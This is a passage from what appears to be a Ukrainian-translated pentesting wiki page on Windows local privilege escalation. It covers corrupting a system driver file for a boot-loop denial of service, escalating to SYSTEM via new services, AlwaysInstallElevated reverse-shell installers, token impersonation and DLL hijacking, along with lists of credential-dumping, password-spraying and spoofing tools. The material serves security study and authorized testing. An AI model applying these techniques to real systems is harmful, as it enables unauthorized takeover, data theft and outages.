```
3. Дочекайтеся, поки привілейований компонент запише лог (наприклад, адміністратор натисне «надіслати тестове SMS»). Тепер дані записуються в `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (за допомогою hex/PE-парсера), щоб підтвердити пошкодження; перезавантаження змусить Windows завантажити підмінений драйвер → **boot loop DoS**. Цей підхід також можна застосувати до будь-якого захищеного файла, який привілейована служба відкриває для запису.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія є в `C:\Windows\System32\cng.sys`, система може спробувати використати її першою, що робить цей файл надійною ціллю для DoS за допомогою пошкоджених даних.



## **Від High Integrity до System**

### **Нова служба**

Якщо ви вже працюєте в процесі з High Integrity, **шлях до SYSTEM** може бути простим: **створити й запустити нову службу**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Під час створення бінарного файлу служби переконайтеся, що це дійсна служба або що бінарний файл швидко виконує необхідні дії, оскільки його буде завершено через 20 с, якщо це не дійсна служба.

### AlwaysInstallElevated

Із процесу з високим рівнем цілісності можна спробувати **увімкнути записи AlwaysInstallElevated у реєстрі** та **встановити** reverse shell за допомогою обгортки _**.msi**_.\
[Детальніше про задіяні ключі реєстру та встановлення пакета _.msi_ тут.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Код можна** [**знайти тут**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Якщо ви маєте ці привілеї токена (імовірно, ви знайдете їх у процесі з високим рівнем цілісності), то зможете **відкрити майже будь-який процес** (окрім захищених процесів), використовуючи привілей SeDebug, **скопіювати токен** процесу та створити **довільний процес із цим токеном**.\
Зазвичай для цієї техніки **вибирають будь-який процес, що працює від імені SYSTEM і має всі привілеї токена** (_так, можна знайти процеси SYSTEM без усіх привілеїв токена_).\
[**Приклад коду, що виконує запропоновану техніку, можна знайти тут**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Цю техніку використовує meterpreter для підвищення привілеїв у `getsystem`. Вона полягає в тому, щоб **створити pipe, а потім створити/зловживати службою, яка писатиме в цей pipe**. Після цього **сервер**, який створив pipe за допомогою привілею **`SeImpersonate`**, зможе **імперсонувати токен** клієнта pipe (служби) й отримати привілеї SYSTEM.\
Якщо ви хочете [**дізнатися більше про іменовані pipe, прочитайте це**](#named-pipe-client-impersonation).\
Якщо хочете прочитати приклад [**підвищення рівня цілісності з високого до System за допомогою іменованих pipe, прочитайте це**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Якщо вам вдасться **перехопити dll**, яку **завантажує** **процес**, що працює від імені **SYSTEM**, ви зможете виконати довільний код із відповідними дозволами. Тому Dll Hijacking також корисний для такого підвищення привілеїв; до того ж його **набагато легше здійснити з процесу з високим рівнем цілісності**, оскільки такий процес матиме **дозвіл на запис** у папки, з яких завантажуються dll.\
[**Дізнайтеся більше про Dll hijacking тут**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Читайте:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Статичні бінарні файли impacket](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Перевіряє неправильні налаштування та конфіденційні файли (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Виявляється.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Перевіряє деякі можливі неправильні налаштування та збирає інформацію (**[**дивіться тут**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Перевіряє неправильні налаштування**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Витягує збережені дані сеансів PuTTY, WinSCP, SuperPuTTY, FileZilla та RDP. Для локального запуску використовуйте -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Витягує облікові дані з Credential Manager. Виявляється.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Розпорошує зібрані паролі по домену**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh — це засіб підміни ADIDNS/LLMNR/mDNS і man-in-the-middle для PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Базове перерахування Windows для privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Пошук відомих вразливостей privesc (ЗАСТАРІЛИЙ, замість нього використовуйте Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Локальні перевірки **(Потрібні права адміністратора)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Пошук відомих вразливостей privesc (потрібно скомпілювати за допомогою VisualStudio) ([**скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Перераховує хост у пошуках неправильних налаштувань (більше інструмент для збору інформації, ніж для privesc) (потрібно скомпілювати) **(**[**скомпільований**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Витягує облікові дані з багатьох програм (скомпільований exe доступний на github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Порт PowerUp на C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Перевіряє неправильні налаштування (скомпільований виконуваний файл доступний на github). Не рекомендовано. Погано працює у Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Перевіряє можливі неправильні налаштування (exe на Python). Не рекомендовано. Погано працює у Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Інструмент, створений на основі цієї публікації (для належної роботи йому не потрібен accesschk, але він може його використовувати).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Читає вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Читає вивід **systeminfo** і рекомендує робочі експлойти (локальний Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Проєкт потрібно скомпілювати з правильною версією .NET ([дивіться тут](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Щоб дізнатися встановлену версію .NET на хості-жертві, виконайте:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Основи підвищення привілеїв у Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Підвищення привілеїв через використання слабких дозволів на папки](http://www.greyhathacker.net/?p=738)
- [3] [Підвищення привілеїв у Windows — шпаргалка](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — практикум з локального підвищення привілеїв у Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — Атаки на Windows: AT — це новий чорний (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Підвищення привілеїв — Windows — повний посібник OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — підвищення привілеїв — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Посібник з підвищення привілеїв у Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Чекліст підвищення привілеїв у Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Методи підвищення привілеїв у Windows для пентестерів](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: фішинг через макрос Word VBA за допомогою SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak format-string + stack BOF → VirtualAlloc ROP (RCE) і крадіжка kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — Полювання на Silver Fox: кішки-мишки в тінях ядра](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Уразливість файлової системи з підвищеними привілеями в системі SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Інструменти тестування symbolic link — використання CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Зв'язок із минулим. Зловживання символічними посиланнями у Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (порт Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: небезпечне визначення розташування модулів у Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Модулі Node.js: завантаження з папок `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — Розв'язані завдання-челенджі за чеклістом C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — Функція RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own із Microslop: поєднання race condition у ядрі CLDFLT і DirectX для LPE у Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Одне I/O Ring, щоб керувати ними всіма: повноцінна примітива експлойту для читання/запису у Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Зловживання довільним видаленням файлів для підвищення привілеїв та інші корисні трюки](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — код експлойту FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — Атаки на WSUS, частина 2: CVE-2020-1013, локальне підвищення привілеїв у Windows 10, експлойт на один день](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: дослідження Credential Manager і Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC для CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — Делегування Kerberos Resource Based Constrained Delegation: як зміна образу призводить до підвищення привілеїв](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — Вилучення приватних SSH-ключів з агента SSH у Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — Перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — Перетворення корпоративних серверів оновлень на фабрики бекдорів (0_o) — частина 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — Підвищення привілеїв через видалення папки Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
